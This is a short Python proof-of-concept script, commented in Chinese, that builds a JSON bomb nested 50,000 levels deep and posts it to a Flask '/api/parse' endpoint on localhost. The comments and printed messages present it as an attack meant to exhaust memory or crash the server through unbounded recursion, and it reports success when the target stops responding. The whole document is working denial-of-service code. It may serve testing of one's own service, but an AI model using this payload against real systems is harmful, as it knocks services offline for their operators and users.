import requests

url = "http://127.0.0.1:5000/api/parse"
headers = {
    "Content-Type": "application/json"
}

# 生成一个深度嵌套的 JSON（比如嵌套 50000 层）
# 旧版 Flask 解析这个会触发无限递归，直接耗尽内存/崩溃
depth = 50000
malicious_payload = '{"a":' * depth + '1' + '}' * depth

print(f"[*] Sending a nested JSON bomb with a depth of {depth} to the target...")
try:
    # 设置超时时间，防止本地脚本卡死
    response = requests.post(url, headers=headers, data=malicious_payload, timeout=10)
    print(f"[+] Target response status code: {response.status_code}")
    print(f"[+] Target response content: {response.text[:200]}...")
except Exception as e:
    print(f"[-] The attack has taken effect; the target is unresponsive or the connection has been interrupted! Error message: {e}")